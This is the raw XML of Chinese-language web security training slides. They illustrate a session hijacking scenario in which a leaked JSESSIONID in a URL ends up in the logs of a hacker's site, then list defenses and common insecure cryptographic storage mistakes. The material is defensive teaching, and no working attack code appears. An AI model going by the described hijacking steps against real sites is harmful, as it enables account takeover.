                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>这个链接 </a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447522" name="Rectangle 34"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="788988" y="1773238"/>
            <a:ext cx="4876800" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solid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en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>www.boi.com?JSESSIONID=9FA1DB9EA...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 44"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3341688" y="5089525"/>
            <a:ext cx="4319587" cy="644525"/>
            <a:chOff x="2105" y="3206"/>
            <a:chExt cx="2721" cy="406"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447523" name="Oval 35"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4529" y="3256"/>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4</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447524" name="Rectangle 36"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="2105" y="3206"/>
              <a:ext cx="2453" cy="406"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038" anchor="ctr"/>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黑客在</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:hlinkClick r:id="rId4"/>
                </a:rPr>
                <a:t>www.hacker.com</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>的日志文件</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>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中得到用户的</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> JSESSIONID</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>值 </a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-US" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447525" name="Freeform 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3608388" y="3816350"/>
            <a:ext cx="5157787" cy="1135063"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="141"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="813" y="4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2853" y="165"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="3190" y="715"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3249" h="715">
                <a:moveTo>
                  <a:pt x="0" y="141"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="135" y="118"/>
                  <a:pt x="338" y="0"/>
                  <a:pt x="813" y="4"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1288" y="8"/>
                  <a:pt x="2457" y="46"/>
                  <a:pt x="2853" y="165"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3249" y="284"/>
                  <a:pt x="3120" y="601"/>
                  <a:pt x="3190" y="715"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="med"/>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="7" name="Group 45"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="107950" y="5549900"/>
            <a:ext cx="3311525" cy="1047750"/>
            <a:chOff x="68" y="3496"/>
            <a:chExt cx="2086" cy="660"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447526" name="Oval 38"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="68" y="3558"/>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5</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1400" b="1">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="447527" name="Rectangle 39"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="449" y="3496"/>
              <a:ext cx="1705" cy="660"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525">
              <a:noFill/>
              <a:miter lim="800000"/>
            </a:ln>
            <a:effectLst/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr lIns="92075" tIns="46038" rIns="92075" bIns="46038"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr>
                <a:lnSpc>
                  <a:spcPct val="115000"/>
                </a:lnSpc>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宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>黑客使用</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t> JSESSIONID </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" b="1">
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>获取到受害者的帐号</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447528" name="Freeform 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="10800000">
            <a:off x="2465388" y="4406900"/>
            <a:ext cx="5538787" cy="1828800"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst>
              <a:cxn ang="0">
                <a:pos x="0" y="141"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="813" y="4"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="2853" y="165"/>
              </a:cxn>
              <a:cxn ang="0">
                <a:pos x="3190" y="715"/>
              </a:cxn>
            </a:cxnLst>
            <a:rect l="0" t="0" r="r" b="b"/>
            <a:pathLst>
              <a:path w="3249" h="715">
                <a:moveTo>
                  <a:pt x="0" y="141"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="135" y="118"/>
                  <a:pt x="338" y="0"/>
                  <a:pt x="813" y="4"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="1288" y="8"/>
                  <a:pt x="2457" y="46"/>
                  <a:pt x="2853" y="165"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="3249" y="284"/>
                  <a:pt x="3120" y="601"/>
                  <a:pt x="3190" y="715"/>
                </a:cubicBezTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="57150" cap="flat" cmpd="sng">
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd type="none" w="med" len="me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47493"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromBottom)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44749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47502"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(left)">
                                      <p:cBhvr>
                                        <p:cTn id="11" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="447502"/>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2" fill="hold" grpId="0" nodeType="clickEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="447519"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(right)">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="447519"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffec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par>
                          <p:cTn id="23" fill="hold">
                            <p:stCondLst>
                              <p:cond delay="500"/>
                            </p:stCondLst>
                            <p:childTnLst>
                              <p:par>
                                <p:cTn id="24" presetID="12" presetClass="entr" presetSubtype="2" fill="hold" grpId="0" nodeType="afterEffect">
                                  <p:stCondLst>
                                    <p:cond delay="0"/>
                                  </p:stCondLst>
                                  <p:childTnLst>
                                    <p:set>
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="1" fill="hold">
                                          <p:stCondLst>
                                            <p:cond delay="0"/>
                                          </p:stCondLst>
                                        </p:cTn>
                                        <p:tgtEl>
                                          <p:spTgt spid="447522"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="slide(fromRight)">
                                      <p:cBhvr>
                                        <p:cTn id="26" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44752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47525"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(left)">
                                      <p:cBhvr>
                                        <p:cTn id="31" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="447525"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffec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447528"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(right)">
                                      <p:cBhvr>
                                        <p:cTn id="43" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="447528"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffec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502" grpId="0" animBg="1"/>
      <p:bldP spid="447519" grpId="0" animBg="1"/>
      <p:bldP spid="447522" grpId="0" animBg="1"/>
      <p:bldP spid="447525" grpId="0" animBg="1"/>
      <p:bldP spid="447528"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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、防御会话管理攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="475139" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658813" y="1554163"/>
            <a:ext cx="8111114" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>使用长且复杂的随机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>，难以猜解；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>对</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>的传输、存储进行保护，防止被泄露和劫持；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>SSL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>时，必须保护认证和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Session ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>两部分的内容；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>查询字符串中不要包含有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>User/Session</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>任何信息。</a:t>
            </a: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5139">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4751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51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5139">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4751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51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5139">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4751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51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5139">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4751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51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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、不安全的加密存储</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="422916" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="508000" y="2151063"/>
            <a:ext cx="8435975" cy="3694978"/>
          </a:xfrm>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Web applications </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>rarely use cryptographic functions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> properly to protect data and credentials. Attackers use weakly protected data to conduct identity theft and other crimes, such as credit card fraud.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="422917" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="662277" y="1336675"/>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2916">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4229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r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>6</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>、不安全的加密存储</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="477187" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>常见的问题：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>对敏感信息没有加密；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>继续使用已被证明加密强度不高的算法（ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>MD5, SHA-1, RC3, RC4, etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>加密方法使用不安全，比如对加密口令的存储不加保护；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>尝试使用自己发明的加密方法（实践证明这种方法比较糟糕！）。</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7187">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="477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71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7187">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
